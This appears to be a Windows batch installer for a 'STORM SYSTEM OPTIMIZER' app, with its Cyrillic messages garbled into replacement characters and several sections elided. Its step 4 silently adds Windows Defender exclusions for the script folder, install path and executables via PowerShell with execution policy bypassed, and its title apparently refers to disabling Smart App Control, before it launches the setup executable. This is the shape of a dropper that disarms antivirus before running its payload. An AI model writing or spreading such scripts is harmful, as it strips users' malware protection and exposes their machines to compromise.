@echo off
chcp 65001 >nul
title STORM FELLOWSHIP - ������������� Smart App Control � ������� �����������
...
echo.
echo [4/5] ���������� ����� ���������� � ���������� ���� ���������...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormFellowship' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormFellowship.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_0.2.3_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo [OK] ���������� � ������ �� ���������� ���������!
...
:: ============================================================
echo.
echo [5/5] ������ STORM FELLOWSHIP v0.2.3...
echo.
echo ============================================================
echo   ������! ��� ���������� ������� �����.
echo ============================================================
...
if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_0.2.3_Setup.exe" (
    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_0.2.3_Setup.exe"
) else if exist "%SCRIPT_DIR%Assembling\StormFellowship.exe" (
    start "" "%SCRIPT_DIR%Assembling\StormFellowship.exe"
) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_0.2.3_Setup.exe" (
    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_0.2.3_Setup.exe"
)
